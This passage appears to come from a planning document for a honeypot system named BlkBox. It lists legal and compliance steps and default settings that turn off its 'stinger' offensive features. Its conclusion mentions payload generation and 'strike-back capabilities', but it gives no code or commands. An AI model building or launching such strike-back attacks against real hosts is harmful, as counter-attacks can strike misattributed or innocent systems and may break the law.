1. **Legal Review**: Consult legal counsel
2. **Authorization**: Written authorization for deployment infrastructure
3. **Terms of Service**: Clear warning banners on all honeypots
4. **Jurisdiction**: Verify compliance with local laws
5. **Data Protection**: GDPR/CCPA compliance if applicable
6. **Safeguards**: Enable all safeguards (whitelisting, geofencing, dry-run mode)
7. **Audit Trail**: Comprehensive logging for accountability

**Default Configuration**: All offensive capabilities DISABLED by default
- `stinger.enabled: false`
- `stinger.autoTrigger: false`
- `stinger.dryRun: true`
- `stinger.requireApproval: true`

---

## Conclusion

Phases 6-10 complete the BlkBox honeypot system with:
- Advanced payload generation and delivery
- Comprehensive strike-back capabilities with safeguards
- Full system integration and orchestration
- FTP protocol support
- Real-time monitoring and analytics

The system will be production-ready with robust security, legal compliance, and operational monitoring.
